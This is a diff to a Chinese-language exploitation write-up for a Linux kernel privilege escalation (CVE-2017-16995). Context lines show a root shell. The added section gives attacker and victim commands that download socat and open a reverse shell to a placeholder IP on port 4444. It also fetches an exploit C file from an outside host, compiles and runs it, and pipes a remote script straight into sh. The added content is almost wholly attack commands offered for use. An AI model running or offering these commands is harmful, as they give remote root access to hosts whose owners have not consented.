@@ -110,7 +110,23 @@ spawning root shell
 root@ubuntu:/tmp# id
 uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:kernel_t:s0
 ```
+### 利用socat获取一个tty shell
+```
+hacker: 监听port
 
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+victims：弹shell 下载编译exp
+
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:x.x.x.x:4444
+
+wget -P /tmp http://cyseclabs.com/exploits/upstream44.c &&cd /tmp && gcc -o pwned  upstream44.c && chmod 777 pwned && ./pwned
+
+or you can do that 
+
+sh -c "$(wget http://x.x.x.x/exp.sh -O -)"
+
+```
 ### 参考链接
 
 https://access.redhat.com/security/cve/cve-2017-16995
